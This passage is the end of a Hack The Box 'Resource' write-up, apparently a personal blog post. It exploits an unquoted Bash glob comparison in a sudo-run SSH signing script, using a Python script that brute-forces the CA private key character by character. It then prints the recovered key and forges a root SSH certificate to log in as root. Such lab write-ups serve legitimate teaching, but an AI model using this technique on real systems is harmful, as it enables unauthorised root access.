</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>supported_principals</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;webserver,analytics,support,security&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>IFS</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;,&#39;</span> <span style=color:#e5c07b>read</span> -ra principal <span style=color:#56b6c2>&lt;&lt;&lt;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal_str</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> word in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>principal</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> ! <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$supported_principals</span><span style=color:#98c379>&#34;</span> | grep -qw <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#39; is not a supported principal.&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Choose from:&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    webserver - external web servers - webadmin user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    analytics - analytics team databases - analytics user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    support - IT support server - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    security - SOC servers - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$serial</span> <span style=color:#56b6c2>=</span>~ ^<span style=color:#56b6c2>[</span>0-9<span style=color:#56b6c2>]</span>+$ <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$serial</span><span style=color:#98c379>&#39; is not a number.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ssh-keygen -s <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span> -z <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$serial</span><span style=color:#98c379>&#34;</span> -I <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$username</span><span style=color:#98c379>&#34;</span> -V -1w:forever -n <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal</span><span style=color:#98c379>&#34;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><p>After reviewing the script carefully we discover a vulnerability, the right side of the matching operation <code>[[ $itca == $ca ]]</code> is not quoted, making this succeptible to brute force attacks. Without those quotes Bash performs pattern matching instead of interpreting the input as a string.</p><p>For instance if we have a password matching operation with <code>[[$DB_PASS == mystrongpassword]]</code>, inputting <code>mys*</code> will evaluate to <code>true</code> because it is a glob pattern matching any string starting with those three letters. Similarly, in the <code>sign_key.sh</code> script, the line <code>[[ $itca == $ca ]]</code> compares the two strings without quoting allowing us to reconstruct the CA content incrementally by brute forcing it. We use the script below to find the CA content.</p><blockquote><p>In <code>etc/ssh/auth_principals/root</code> we find the valid principal name for root is <code>root_user</code>.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>subprocess</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>charset</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=</span><span style=color:#98c379>\n</span><span style=color:#98c379> &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;-----BEGIN OPENSSH PRIVATE KEY-----</span><span style=color:#98c379>\n</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>temp_ca_file</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;temp_ca_guess&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>while</span> <span style=color:#e5c07b>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>found_character</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>char</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>charset</span>:
</span></span><span style=display:flex><span>        <span style=color:#7f848e># Create the temporary CA file with the current guess</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>current_guess</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>char</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;*&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>temp_ca_file</span>, <span style=color:#98c379>&#34;w&#34;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>f</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>f</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>write</span>(<span style=color:#e06c75>current_guess</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e06c75>result</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>subprocess</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>run</span>(
</span></span><span style=display:flex><span>            [<span style=color:#98c379>&#34;sudo&#34;</span>, <span style=color:#98c379>&#34;/opt/sign_key.sh&#34;</span>, <span style=color:#e06c75>temp_ca_file</span>, <span style=color:#98c379>&#34;test.pub&#34;</span>, <span style=color:#98c379>&#34;root&#34;</span>, <span style=color:#98c379>&#34;root_user&#34;</span>, <span style=color:#98c379>&#34;1&#34;</span>],
</span></span><span style=display:flex><span>            <span style=color:#e06c75>stdout</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>subprocess</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>PIPE</span>,
</span></span><span style=display:flex><span>            <span style=color:#e06c75>text</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#98c379>&#34;Use API for signing with this CA&#34;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>result</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>stdout</span>:
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Correct character found, append to discovered_ca</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>+=</span> <span style=color:#e06c75>char</span>
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Discovered so far: </span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>found_character</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>break</span>  <span style=color:#7f848e># Break inner loop to continue building the CA string</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#56b6c2>not</span> <span style=color:#e06c75>found_character</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#98c379>&#34;-----END OPENSSH PRIVATE KEY-----&#34;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>discovered_ca</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[!] Full CA content discovered:</span><span style=color:#98c379>\n</span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[!] Script terminated prematurely. Partial CA content:</span><span style=color:#98c379>\n</span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>break</span>
</span></span></code></pre></div><p>After running the script we recover the key and save it in a file (I named it <code>root.key</code> in my case).</p><blockquote><p>We need to add <code>-----END OPENSSH PRIVATE KEY-----</code> to the key manually.</p></blockquote><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
</code></pre><p><img src=/images/HTB-Resource/CA_content.png alt="CA content"></p><p>We can go back to our local machine, and generate SSH keys for root.</p><ol><li>Generate a key pair for root</li></ol><pre tabindex=0><code>ssh-keygen -f root
</code></pre><ol start=2><li>Change the permission of the key recovered.</li></ol><pre tabindex=0><code>chmod 600 root.key
</code></pre><ol start=3><li>Create a SSH certificate by signing the public key.</li></ol><pre tabindex=0><code>ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
</code></pre><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-s root.key</td><td>Specifies the signing key, which is the private key of the Certificate Authority (CA).</td></tr><tr><td>-z 200</td><td>Specifies the certificate serial number. This is a unique identifier for the certificate.</td></tr><tr><td>-I root</td><td>Specifies the key identity string. The identity (<code>root</code>) is an arbitrary label for the certificate.</td></tr><tr><td>-V -52w:forever</td><td>Specifies the validity period.</td></tr><tr><td>-n root_user</td><td>Specifies the authorized principals (usernames or roles).</td></tr><tr><td>root.pub</td><td>Specifies the public key file being signed. The certificate will be generated for this key, and the resulting file will be named <code>root-cert.pub</code>.</td></tr></tbody></table><ol start=4><li>Login as root</li></ol><pre tabindex=0><code>ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
</code></pre><blockquote><p>The private key (<code>root</code>) provides proof of ownership, while the certificate (<code>root-cert.pub</code>) establishes trust between our key and the server. The server validates the certificate using the CA public key stored in its configuration (from <code>TrustedUserCAKeys</code>), and then uses the private key to complete the authentication process. The certificate tells the server to trust the public key in <code>root.pub</code> because it was signed by the trusted Certificate Authority (CA). Without the certificate, the server wouldn’t recognize the root key as a trusted identity.</p></blockquote><p><img src=/images/HTB-Resource/root_flag.png alt="root ssh login and flag"></p><p>Thanks for reading this write up!</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-axlle/>&#8592;
Previous:
HTB: Axlle</a></p><p class=prev-post-date>November 15, 2024</p></div><div class=next-post><p><a href=/posts/thm-thestickershop/>Next:
THM: The Sticker Shop
&#8594;</a></p><p class=next-post-date>December 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-msainristil-on-itrc-host>Shell as msainristil (on itrc host)</a></li><li><a href=#shell-as-zzinter-on-itrc-host>Shell as zzinter (on itrc host)</a></li><li><a href=#shell-as-support-on-ssg-host>Shell as support (on ssg host)</a></li><li><a href=#shell-as-zzinter-on-ssg-host>Shell as zzinter (on ssg host)</a></li></ul></li><li><a href=#privilege-escalation---root-shell-on-ssg-host>Privilege Escalation - root shell (on ssg host)</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>